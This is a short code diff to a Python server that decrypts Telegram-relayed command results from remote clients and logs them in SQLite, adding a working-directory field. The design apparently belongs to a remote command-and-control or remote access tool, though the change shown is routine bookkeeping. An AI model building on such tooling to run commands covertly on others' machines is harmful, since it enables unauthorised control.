@@ -439,6 +439,7 @@ def listen_telegram_group():
                                 result_obj = json.loads(decrypted)
                                 cmd_text   = result_obj.get("command", "")
                                 result_txt = result_obj.get("result", "")
+                                cmd_cwd    = result_obj.get("cwd")
 
                                 # تحديث أقدم أمر pending لهذا الكلاينت، وإلا نُنشئ سجلاً جديداً
                                 try:
@@ -450,14 +451,14 @@ def listen_telegram_group():
                                     ).fetchone()
                                     if row:
                                         conn.execute(
-                                            'UPDATE commands SET status="done", result=?, executed_at=? WHERE id=?',
-                                            (result_txt, time.time(), row[0])
+                                            'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
+                                            (result_txt, time.time(), cmd_cwd, row[0])
                                         )
                                     else:
                                         conn.execute(
-                                            'INSERT INTO commands (command, client_id, status, result, created_at, executed_at) '
-                                            'VALUES (?,?,?,?,?,?)',
-                                            (cmd_text, client_id, "done", result_txt, time.time(), time.time())
+                                            'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
+                                            'VALUES (?,?,?,?,?,?,?)',
+                                            (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd)
                                         )
                                     conn.commit()
                                     conn.close()
@@ -566,6 +567,7 @@ def process_tg_message():
                     result_obj = json.loads(decrypted)
                     cmd_text   = result_obj.get("command", "")
                     result_txt = result_obj.get("result", "")
+                    cmd_cwd    = result_obj.get("cwd")
 
                     try:
                         conn = sqlite3.connect(DB_PATH)
@@ -576,14 +578,14 @@ def process_tg_message():
                         ).fetchone()
                         if row:
                             conn.execute(
-                                'UPDATE commands SET status="done", result=?, executed_at=? WHERE id=?',
-                                (result_txt, time.time(), row[0])
+                                'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
+                                (result_txt, time.time(), cmd_cwd, row[0])
                             )
                         else:
                             conn.execute(
-                                'INSERT INTO commands (command, client_id, status, result, created_at, executed_at) '
-                                'VALUES (?,?,?,?,?,?)',
-                                (cmd_text, client_id, "done", result_txt, time.time(), time.time())
+                                'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
+                                'VALUES (?,?,?,?,?,?,?)',
+                                (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd)
                             )
                         conn.commit()
                         conn.close()
